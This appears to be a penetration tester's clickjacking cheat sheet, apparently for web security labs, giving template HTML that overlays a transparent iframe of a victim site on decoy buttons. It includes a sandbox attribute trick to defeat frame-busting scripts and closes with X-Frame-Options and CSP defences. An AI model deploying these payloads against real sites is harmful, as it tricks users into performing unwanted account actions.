# Tools
- Burp Suite's built in "Clickbandit"
# Reconnaissance
- Pages where account sensitive operations are performed
- Pages where the user could be forced to send data
- If needed, look for ways to prepopulate data with query parameters
# Samples
Single Action - Sample HTML
```html
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Click here</div>
<iframe src="website-here"></iframe>
```
Add `sandbox="allow-forms"` and/or `allow-scrips` if there is a frame buster script
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```

- **Note:** Prefilled form data -  Use a get request with parameters that prepopulate the form if it is possible.

Multistep Action - Sample HTML
```html
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```
# Prevention
- X-Frame-Options header
- Content Security Policy (CSP): frame-ancestors ['self'|'none'|website]
